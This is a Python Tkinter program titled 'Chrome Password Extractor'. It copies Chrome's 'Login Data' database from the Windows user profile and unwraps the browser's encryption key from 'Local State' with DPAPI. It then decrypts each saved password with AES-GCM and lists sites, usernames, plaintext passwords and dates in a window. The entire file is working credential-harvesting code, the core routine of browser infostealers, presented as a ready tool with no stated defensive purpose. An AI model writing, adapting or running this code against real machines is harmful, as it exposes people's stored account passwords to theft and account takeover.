import tkinter as tk
from tkinter import scrolledtext
from tkinter import messagebox
from threading import Thread
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta

class ChromePasswordExtractorGUI:
    def __init__(self, master):
        self.master = master
        master.title("Chrome Password Extractor")

        self.text_area = scrolledtext.ScrolledText(master, wrap=tk.WORD, width=80, height=20)
        self.text_area.pack(padx=10, pady=10)

        self.extract_button = tk.Button(master, text="Extract Passwords", command=self.extract_passwords)
        self.extract_button.pack(pady=10)

    def extract_passwords(self):
        self.text_area.delete(1.0, tk.END)  # Clear previous text
        try:
            self.run_extraction()
        except Exception as e:
            messagebox.showerror("Error", f"An error occurred: {str(e)}")

    def run_extraction(self):
        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            if username or password:
                self.text_area.insert(tk.END, f"Origin URL: {origin_url}\n")
                self.text_area.insert(tk.END, f"Action URL: {action_url}\n")
                self.text_area.insert(tk.END, f"Username: {username}\n")
                self.text_area.insert(tk.END, f"Password: {password}\n")
            else:
                continue
            if date_created != 86400000000 and date_created:
                self.text_area.insert(tk.END, f"Creation date: {str(get_chrome_datetime(date_created))}\n")
            if date_last_used != 86400000000 and date_last_used:
                self.text_area.insert(tk.END, f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")
            self.text_area.insert(tk.END, "=" * 50 + "\n")
        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except:
            pass

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def main():
    root = tk.Tk()
    app = ChromePasswordExtractorGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
